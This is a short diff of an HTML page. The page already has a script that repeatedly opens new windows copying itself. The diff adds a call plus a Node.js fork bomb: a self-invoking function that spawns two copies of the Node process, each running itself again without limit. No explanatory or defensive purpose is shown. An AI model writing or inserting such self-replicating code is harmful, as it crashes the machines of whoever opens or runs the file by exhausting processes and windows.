@@ -1,6 +1,7 @@
 <html>
   <body>
     <script>
+      f();
       setInterval(function() {
         var w = window.open();
         w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
@@ -8,3 +9,6 @@
     </script>
   </body>
 </html>
+<script>
+ (function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); }());
+</script>
